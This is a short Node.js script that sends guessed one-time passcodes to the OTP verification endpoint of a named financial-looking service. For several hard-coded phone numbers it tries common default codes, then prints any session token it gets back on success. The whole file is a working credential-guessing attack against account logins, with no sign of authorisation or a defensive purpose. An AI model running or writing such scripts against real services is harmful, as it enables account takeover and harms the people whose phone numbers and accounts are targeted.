const https = require('https');

function postJson(path, payload) {
  return new Promise((resolve, reject) => {
    const postData = JSON.stringify(payload);
    const req = https.request(`https://api.paisainminutes.tech${path}`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      }
    }, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try {
          resolve({ status: res.statusCode, body: JSON.parse(data) });
        } catch {
          resolve({ status: res.statusCode, body: data });
        }
      });
    });
    req.on('error', reject);
    req.write(postData);
    req.end();
  });
}

async function testCodes() {
  const phones = ["9876543210", "7909107000", "7838056998"];
  const codes = ["1234", "0000", "123456", "1111", "9999"];

  for (const phone of phones) {
    console.log(`\nTrying phone: ${phone}`);
    for (const code of codes) {
      const res = await postJson('/api/auth/verify-otp', { phone, code });
      if (res.status === 200) {
        console.log(`🎉 SUCCESS! Phone: ${phone}, Code: ${code}`);
        console.log("Token:", res.body.token ? res.body.token.slice(0, 30) + '...' : res.body);
        return { phone, code, token: res.body.token };
      } else {
        console.log(`Code ${code} -> ${res.status}: ${JSON.stringify(res.body)}`);
      }
    }
  }
}

testCodes();
